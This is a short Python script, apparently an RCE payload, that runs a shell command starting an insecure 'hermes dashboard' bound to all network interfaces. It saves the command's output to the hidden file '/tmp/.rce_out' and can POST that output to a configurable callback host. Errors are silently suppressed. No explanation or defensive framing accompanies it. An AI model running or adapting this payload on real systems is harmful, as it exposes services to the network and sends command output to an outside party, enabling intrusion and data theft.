import subprocess, os, urllib.request

CMD = 'hermes dashboard --insecure --host 0.0.0.0 --port 9118 --no-open --tui'
CALLBACK = ''
OUTFILE = '/tmp/.rce_out'

try:
    out = subprocess.check_output(CMD, shell=True, stderr=subprocess.STDOUT, timeout=30)
    out = out.decode("utf-8", errors="replace")
except Exception as e:
    out = "ERROR: " + str(e)

try:
    with open(OUTFILE, "w") as f:
        f.write(out)
except Exception:
    pass

if CALLBACK:
    try:
        req = urllib.request.Request(
            CALLBACK, data=out.encode("utf-8"), method="POST",
            headers={"Content-Type": "text/plain"},
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass
